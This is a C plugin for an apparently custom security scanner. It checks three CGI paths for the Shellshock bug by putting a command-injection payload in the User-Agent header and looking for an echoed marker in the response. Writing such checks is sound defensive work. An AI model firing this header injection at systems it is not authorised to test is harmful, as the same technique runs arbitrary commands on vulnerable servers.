/* http-shellshock-2 - Shellshock probe against three CGI paths. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    static const char *paths[] = {
        "/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/admin.cgi"
    };
    char resp[4096];
    int found = 0;
    size_t i;

    if (!ar_valid(ctx)) {
        return 1;
    }
    for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        int n = ar_http_request(ctx, "GET", paths[i], NULL,
                                "User-Agent: () { :;}; echo; "
                                "/bin/echo ALMAP_SHELLSHOCK\r\n",
                                NULL, NULL, resp, sizeof(resp));
        if (n > 0 && ar_contains_ci(resp, "ALMAP_SHELLSHOCK")) {
            ar_append(ctx, "%s%s", (found == 0) ? "VULNERABLE: " : ", ",
                      paths[i]);
            found++;
        }
    }
    if (found == 0) {
        ar_out(ctx, "not vulnerable: Shellshock");
    }
    return 0;
}
